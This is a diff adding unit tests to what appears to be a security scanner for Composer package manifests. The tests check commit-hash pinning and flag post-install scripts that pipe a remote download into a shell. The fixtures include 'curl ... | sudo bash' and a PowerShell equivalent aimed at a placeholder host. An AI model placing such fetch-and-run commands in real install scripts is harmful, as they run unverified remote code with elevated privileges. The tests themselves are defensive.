@@ -277,3 +277,50 @@ class TestCOMPOSER009FalseNegatives:
             },
         )
         assert not findings["COMPOSER-009"].passed
+
+
+class TestAudit202607LowComposerC1:
+    """2026-07 audit LOW findings (composer_c1 chunk)."""
+
+    def test_composer002_commit_hash_is_pinned(self, tmp_path):
+        # The docstring promises a 40-char commit hash is an exact pin.
+        from pipeline_check.core.checks.composer.base import (
+            is_floating_constraint,
+        )
+        assert is_floating_constraint(
+            "abcdef1234567890abcdef1234567890abcdef12"
+        ) is False
+        findings = _scan(
+            tmp_path,
+            {
+                "name": "x",
+                "require": {
+                    "acme/lib": "abcdef1234567890abcdef1234567890abcdef12",
+                },
+            },
+        )
+        assert findings["COMPOSER-002"].passed is True
+
+    def test_composer006_sudo_and_powershell_pipe_to_shell_fire(self, tmp_path):
+        sudo = _scan(
+            tmp_path,
+            {
+                "name": "x",
+                "scripts": {
+                    "post-install-cmd": ["curl https://e.com/i | sudo bash"],
+                },
+            },
+        )
+        assert sudo["COMPOSER-006"].passed is False
+        pwsh = _scan(
+            tmp_path,
+            {
+                "name": "x",
+                "scripts": {
+                    "post-install-cmd": [
+                        "Invoke-WebRequest https://e.com/i | powershell -",
+                    ],
+                },
+            },
+        )
+        assert pwsh["COMPOSER-006"].passed is False
